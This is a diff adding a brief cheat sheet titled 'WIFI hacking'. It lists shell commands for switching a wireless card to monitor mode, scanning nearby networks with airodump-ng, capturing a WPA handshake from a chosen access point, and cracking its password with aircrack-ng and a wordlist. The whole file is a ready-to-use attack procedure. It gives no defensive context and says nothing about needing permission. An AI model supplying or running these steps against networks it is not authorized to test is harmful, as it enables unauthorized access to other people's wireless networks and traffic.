@@ -1,0 +1,21 @@
+WIFI hacking
+
+> SET NETWORK DEVICE TO MONITOR MODE
+	~> ifconfig wlan0 down
+	~> iwconfig wlan0 mode monitor
+	~> ifconfig wlan0 up
+	~> airmon-ng start <network device>
+
+> SET NETWORK DEVICE TO MANAGED MODE
+	~> ifconfig wlan0 down
+	~> iwconfig wlan0 mode managed
+	~> ifconfig wlan0 up
+
+> LIST ALL AVAILABLE NETWORK
+	~> airodump-ng <network device>
+
+> CAPTURE NETWORK HANDSHAKE
+	~> airodump-ng -c <channel> -d <bssid> -w <save file> <network device>
+	
+> CRACK WIFI PASSWORD
+	~> aircrack-ng -w <wordlist> -b <bssid> <packet file> 
